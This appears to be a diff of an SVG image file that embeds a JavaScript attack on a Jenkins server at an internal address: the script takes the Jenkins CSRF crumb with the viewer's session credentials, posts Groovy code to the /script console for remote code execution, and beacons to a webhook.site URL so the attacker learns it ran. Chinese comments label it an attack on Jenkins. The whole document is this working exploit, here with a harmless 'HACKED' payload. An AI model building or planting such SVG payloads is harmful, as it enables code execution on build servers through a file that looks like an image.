@@ -1,18 +1,29 @@
-<svg xmlns="http://www.w3.org/2000/svg">
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <foreignObject width="100%" height="100%">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <iframe srcdoc='&lt;script&gt;
-        // 打点：告诉我攻击被执行了
-        fetch("https://webhook.site/7934d095-0d9f-4592-a002-0f4b9dc3fd8c");
-
-        // 攻击 Jenkins
-        fetch("http://192.168.8.3:8050/script", {
-          method: "POST",
-          headers: {"Content-Type": "application/x-www-form-urlencoded"},
-          body: "script=println(\\"HACKED\\")",
+      <script>
+        // 获取 crumb
+        fetch("http://192.168.8.3:8050/crumbIssuer/api/json", {
           credentials: "include"
+        }).then(res => res.json()).then(data => {
+          const crumbField = data.crumbRequestField;
+          const crumb = data.crumb;
+
+          // 发命令执行请求
+          fetch("http://192.168.8.3:8050/script", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded",
+              [crumbField]: crumb
+            },
+            credentials: "include",
+            body: "script=println('HACKED from SVG')"
+          });
+
+          // webhook 打点
+          fetch("https://webhook.site/7934d095-0d9f-4592-a002-0f4b9dc3fd8c");
         });
-      &lt;/script&gt;'></iframe>
+      </script>
     </body>
   </foreignObject>
 </svg>
